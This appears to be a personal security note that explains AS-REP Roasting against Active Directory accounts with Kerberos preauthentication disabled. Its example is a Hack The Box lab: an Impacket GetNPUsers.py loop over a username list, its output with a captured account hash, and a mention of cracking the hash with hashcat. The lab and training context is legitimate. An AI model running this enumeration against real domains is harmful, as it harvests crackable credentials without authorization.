---
title: AS-REP Roasting
tags:
  - kerberos
  - infosec
  - pentest
---




## AS-REP Roasting 

Two key attacks on [[Kerberos]] security in Active Directory include [[Kerberoasting]] and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF\_DONT\_REQUIRE\_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.

Use the [[Impacket]] tool `GetNPUsers.py` to try to get a hash for each user

```shell
λ ~/ctf/htb/forest/ for user in $(cat usernames.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:25311259ddd6d0e65a4ae2cd898c547b$2328b382956004167ef612abbfd0b3350d362f386d70deadf093d73dd33fadea8bf648d3d7c1cab3565b508a9dafb06cb399ac26e04521ffa22edc882213994257e53976a81b78aaf49dfe02da14f6f76fc7def2a7d4e7e8ff696efa29a1ac4a8df2c0f7856df3c7aa7bbff60e93c1e1fbfc538745a0ffefa3f383d68ddfb4984d1194bc56cc9d168b69a512901815da53cba71a2d0a13c6369fd1b74b9ce3367119502354b2cae4ae3096e5ba4a041fa8a0d1d7f4a92c0f47d2c6ee7bcc73b7f2c3b10955799c807bf43d3035488fb385c68568e770d87d771343e16266ea8f

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

The hash is quickly cracked with `hashcat`.